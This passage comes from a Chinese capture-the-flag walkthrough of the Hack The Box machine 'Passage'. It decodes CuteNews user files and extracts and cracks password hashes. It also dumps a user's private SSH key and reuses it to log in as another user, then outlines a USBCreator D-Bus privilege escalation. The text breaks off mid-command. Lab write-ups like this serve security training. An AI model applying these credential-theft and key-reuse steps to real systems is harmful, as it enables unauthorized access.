?&gt;<br>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=<br>&lt;?php die(<span class="hljs-string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;<br>YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=<br>www-data@passage:/var/www/html/CuteNews/cdata/users$<br></code></pre></td></tr></table></figure>
+
+<p>19、然后对这个目录进行密码的破解，发现了这个文件，由于我bash脚本编写的水平较差，我也不想直接写了，就参考演练报告直接用了他的方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ <span class="hljs-built_in">cat</span> lines | grep -v <span class="hljs-string">&quot;php die&quot;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> decode=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | <span class="hljs-built_in">base64</span> -d); email=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$decode</span> | grep -Po <span class="hljs-string">&#x27;\w+@\w+\.\w+&#x27;</span>); <span class="hljs-built_in">hash</span>=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$decode</span> | grep -Po <span class="hljs-string">&#x27;\w&#123;64&#125;&#x27;</span>); <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$hash</span>&quot;</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$email</span>:<span class="hljs-variable">$hash</span>&quot;</span>; <span class="hljs-keyword">fi</span>; <span class="hljs-keyword">done</span><br>&lt; grep -Po <span class="hljs-string">&#x27;\w&#123;64&#125;&#x27;</span>); <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$hash</span>&quot;</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$email</span>:<span class="hljs-variable">$hash</span>&quot;</span>; <span class="hljs-keyword">fi</span>; <span class="hljs-keyword">done</span>  <br>nadav@passage.htb:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1<br>sid@example.com:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88<br>paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd<br>kim@example.com:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca<br>egre55@test.com:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc<br>www-data@passage:/var/www/html/CuteNews/cdata/users$ <br></code></pre></td></tr></table></figure>
+
+<p>20、这个其中好像就有目标用户的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd<br></code></pre></td></tr></table></figure>
+
+<p>21、这里使用一个在线的密码破解网站 <code>https://crackstation.net/</code> 进行破解，成功破解出密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hash	Type	Result<br>e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd	sha256	atlanta1<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Passage-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>22、这里开启切换用户，进行登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul<br>su paul<br>Password: atlanta1<br><br>paul@passage:/var/www/html/CuteNews/cdata/users$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>paul@passage:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>Desktop    Downloads         Music     Public     user.txt<br>Documents  examples.desktop  Pictures  Templates  Videos<br>paul@passage:~$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(paul) gid=1001(paul) <span class="hljs-built_in">groups</span>=1001(paul)<br>paul@passage:~$ <br></code></pre></td></tr></table></figure>
+
+<p>23、获取到第一个flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">paul@passage:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>d85694c762ac2c6b059cc178cef21434<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>24、通过初始的枚举，当前用户是没有sudo权限的，为了接下来方便枚举，这里读取下ssh秘钥，通过ssh登录下系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash">paul@passage:~$ <span class="hljs-built_in">ls</span> -la /home/nadav<br><span class="hljs-built_in">ls</span> -la /home/nadav<br><span class="hljs-built_in">ls</span>: cannot open directory <span class="hljs-string">&#x27;/home/nadav&#x27;</span>: Permission denied<br>paul@passage:~$ <span class="hljs-built_in">cd</span> .ssh<br><span class="hljs-built_in">cd</span> .ssh<br>paul@passage:~/.ssh$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>authorized_keys  id_rsa  id_rsa.pub  known_hosts<br>paul@passage:~/.ssh$ <span class="hljs-built_in">base64</span> id_rsa<br><span class="hljs-built_in">base64</span> id_rsa<br>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBczE0ckhCUmxk<br>NWZVOW9MMXpwSWZjUGdhVDU0UmIrUURqMm9BSzRNMWc1UGJsS3UvCitMK0pMczdLUDVRTDBDSU5v<br>R0doQjVRM2FhbmZZQW1BTzdZTytqZVVTMjY2QnFnT2o2UGRVT3ZUMEduUzdNNGkKWjJMcG00UXBZ<br>RHl4cmdZOU9tQ2c1TFNOMjZQeDk0OFdFMTJONUh5RkNxTjFoWjZGV1lrNXJ5aXc1QUpUdi9rdApy<br>V0VHdThESlhra2ROYVQrRlJNY1QxdU1RMzJ5NTU2ZmN6bEZRYVhRakI1ZkpVWFlLSURrTGhHblVU<br>VWNBblNKCkpqQkdPWG4xZDJMR0hNQWNIT29mMlFlTHZNVDhoOThoWlFUVWV5UUE1SisyUlo2M2Iw<br>NGR6bVBwQ3hLK2hib2sKc2poRm9YRDhtNURPWWNYUy9ZSHZXMXEza256UXRkZHRxcXVQWFFJREFR<br>QUJBb0lCQUd3cU1ITUpkYnJ0NjdZUQplV3p0djFvZnM3WXBpemhmVnlwSDhQeE1icHYvTVI1eGlC<br>M1lXMERINFR6LzZUUEZKVlIvSzExbnF4YmtJdGxHClFYZEFyYjJFZ01BUWNNd00wbU1hblI3c1o5<br>bzV4c0dZK1RSQmVNQ1lyVjdrbXYxbnM4cWRkTWtXZktsa0wwbHIKbHhOc2ltR3NHWXExMGV3WEVU<br>RlNTRi94ZU9LMTVocDVyendad3JtSTlObzRGRnJYNlAwcjdyZE9heHN3U0ZBaAp6V2QxR2hZayta<br>M3FZVWhDRTBBeEh4cE0wRGxOVkZySXdjMERuTTVqb2dPNkpEeEhrelhhRFVqL0Ewam5qTU16ClIw<br>QXlQL0FFdzdIbXZjclNvRlJ4NmsvTnR6YWVQeklhMkN1R0Rrei9HNk9FaE5WZDJTOC9lbmx4ZjUx<br>TUlPL2sKN3UxZ0I3MENnWUVBMXpMR0EzNUoxSFc3SWNnT0s3bTJIR01kdWVNNEJYOHo4R3JQSWs2<br>TUxaNnc5WDZ5b0JpbwpHUzNCM25nT0t5SFZHRmVRcnB3VDFhL2N4ZEVpOHlldFhqOUZKZDd5ZzJr<br>SWV1RFBwK2dtSFpoVkhHY3dFNkM0Ckl1VnJxVWd6NEZ6eUgxWkZnMzdlbWJ2dXRrSUJ2M0ZWeUY3<br>UlJxRlgvNnk2WDFWYnRrN2tYc01DZ1lFQTFXQkUKTHVoUkZNRGFFSWRmQTE2Q290UnV3d3BRUy9X<br>ZVo4UTVsb09qOStobTd3WUN0R3BiZFM5dXJESGFNWlVIeXNTUgpBSFJGeElUcjRTYmk1MUJIVXNu<br>d0h6SlowbzZ0UkZNWGFjTjkzZzNZMmJUOXlaMnpqOWt3R00yNXlTaXpFV0gwClZ2UEtlUllNbEdu<br>WHFCdkpvUkU0M3dkUWFQR1lnVzJiajZZbHQxOENnWUJSelNzWUNObG51Wmo0cm1NMG05TnQKMXY5<br>bHVjbUJ6V2lnNnZqeHdZbm5qWHNXMXFKdjJPK05JcWVmT1dPcFlhTHZMZG9CaGJMRWQ2VWtUT3RN<br>SXJqMApLbmpPZklFVEVzbjJhNTZENU9zWU5OK2xmRlA2SWczY3RmakcwSHRudmUwTG5HK3dISG5o<br>Vmw3WFNTQUE5Y1AxCjlwVDJsRDR2SWlsMk02dzVFS1Flb1FLQmdRQ01NczE2R0xFMXRxVlJXUEVI<br>OExCYk5zTjBLYkdxeHo4R3BUckYKZDhkajIzTE91SjlNVmRtei9LOTJPdWRIenNrbzVORDFnSEJh<br>K0k5WUI4bnMvS1Z3Y3pqdjlwQm9OZEVJNUtPcwpuWU4xUkpub0tmRGE2V0NUTXJ4VWY5QURxVmRI<br>STVwOUM0Qk00VHp3d3o2c3VWMVpGRXpPMWlweVdkTy9ydm9ZCmY2Mm1kd0tCZ1FDQ3ZqOTZsV3k0<br>MVVvZmM4eTY1Q0ppMTI2TSs5T0VsYmhza1JpV2xCM09JRGI1MW1iU1lneU0KVXh1N1Q4SFkyQ2NX<br>aUtHZStURVg2bXc5VkZ4YU95aUJtOFJlU0M3U2syMUdBU3k4S2dxdGZaeTdwWkd2YXpEcwpPUjN5<br>Z3BLczA5eXU3c3ZRaThqMnF3YzdGTDZERVI3NHl3cytmNTM4aEk3U0hCdjlmWVBWeXc9PQotLS0t<br>LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=<br>paul@passage:~/.ssh$ <br><br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> LS0tLS1CRUdJTi...........SU0EgUFJJVkFURSBLRVktLS0tLQo=  | <span class="hljs-built_in">base64</span> -d &gt; id_rsa<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">chmod</span> 600 id_rsa  <br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh paul@10.10.10.206 -i id_rsa        <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.206 (10.10.10.206)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:BD7E5sbGZ+avx6QQcDrb9FWVVlbulHrgseaqsAQrvC4.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.206<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">paul@passage:~$ id</span><br><span class="hljs-string">uid=1001(paul) gid=1001(paul) groups=1001(paul)</span><br><span class="hljs-string">paul@passage:~$ </span><br></code></pre></td></tr></table></figure>
+
+<p>25、这里其实在读取秘钥的时候，发现了一个信息，秘钥好像和另一个用户是共用的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">paul@passage:~$ <span class="hljs-built_in">cd</span> .ssh<br>paul@passage:~/.ssh$ <span class="hljs-built_in">ls</span><br>authorized_keys  id_rsa  id_rsa.pub  known_hosts<br>paul@passage:~/.ssh$ <span class="hljs-built_in">cat</span> authorized_keys<br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage<br>paul@passage:~/.ssh$<br></code></pre></td></tr></table></figure>
+
+<p><code>在信息搜集中，发现了当前 paul 下的 ssh 秘钥认证中存在 nadav@passage 标识，疑似秘钥公用，尝试下</code></p>
+<p>26、开始尝试登录下，是否可以登录另一个用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh nadav@10.10.10.206 -i id_rsa    <br>Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1<br>nadav@passage:~$ <span class="hljs-built_in">id</span><br>uid=1000(nadav) gid=1000(nadav) <span class="hljs-built_in">groups</span>=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br>nadav@passage:~$ <br></code></pre></td></tr></table></figure>
+
+<p>27、同样的当前账号也没法看sudo的情况，通过枚举，发现这里的漏洞有点超纲了，我不会做 &#x3D; &#x3D;！</p>
+<p>28、下面跟着演练报告走吧</p>
+<p><code>USB创建器</code><br><code>Palo Alto 的 Unit42 于 2019 年 7 月发表的一篇博客文章显示了他们在 USBCreator D-Bus 接口中发现的一个缺陷：</code></p>
+<p><code>允许访问 sudoer 组中用户的攻击者绕过 sudo 程序施加的密码安全策略。该漏洞允许攻击者以 root 身份使用任意内容覆盖任意文件，而无需提供密码。这很容易导致特权提升，例如，通过覆盖影子文件并为 root 设置密码。</code></p>
+<p><code>D-Bus是一个消息传递系统，是许多 Linux 系统上的核心系统，允许同一系统上运行的进程之间进行通信。该漏洞在于该进程、接口如何错误地允许攻击者触发它以 root 身份执行一些非预期的、任意写入操作。</code></p>
+<p>29、查看根目录下的 .viminfo 信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">nadav@passage:~$ <span class="hljs-built_in">cat</span> .viminfo<br><span class="hljs-comment"># This viminfo file was generated by Vim 7.4.</span><br><span class="hljs-comment"># You may edit it if you&#x27;re careful!</span><br><br><span class="hljs-comment"># Value of &#x27;encoding&#x27; when this file was written</span><br>*encoding=utf-8<br><br><br><span class="hljs-comment"># hlsearch on (H) or off (h):</span><br>~h<br><span class="hljs-comment"># Last Substitute Search Pattern:</span><br>~MSle0~&amp;AdminIdentities=unix-group:root<br><br><span class="hljs-comment"># Last Substitute String:</span><br><span class="hljs-variable">$AdminIdentities</span>=unix-group:sudo<br><br><span class="hljs-comment"># Command Line History (newest to oldest):</span><br>:wq<br>:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g<br><br><span class="hljs-comment"># Search String History (newest to oldest):</span><br>? AdminIdentities=unix-group:root<br><br><span class="hljs-comment"># Expression History (newest to oldest):</span><br><br><span class="hljs-comment"># Input Line History (newest to oldest):</span><br><br><span class="hljs-comment"># Input Line History (newest to oldest):</span><br><br><span class="hljs-comment"># Registers:</span><br><br><span class="hljs-comment"># File marks:</span><br><span class="hljs-string">&#x27;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</span><br><span class="hljs-string">&#x27;</span>1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf<br><br><span class="hljs-comment"># Jumplist (newest first):</span><br>-<span class="hljs-string">&#x27;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</span><br><span class="hljs-string">-&#x27;</span>  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf<br>-<span class="hljs-string">&#x27;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</span><br><span class="hljs-string">-&#x27;</span>  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf<br>-<span class="hljs-string">&#x27;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</span><br><span class="hljs-string">-&#x27;</span>  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf<br><br><span class="hljs-comment"># History of marks within files (newest to oldest):</span><br><br>&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf<br>        <span class="hljs-string">&quot;       12      7</span><br><span class="hljs-string"></span><br><span class="hljs-string">&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</span><br><span class="hljs-string">        &quot;</span>       2       0<br>        .       2       0<br>        +       2       0<br>nadav@passage:~$ <br></code></pre></td></tr></table></figure>
+
+<p>30、开始复制密码用户登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs bash">nadav@passage:~$ <span class="hljs-built_in">cp</span> /etc/passwd 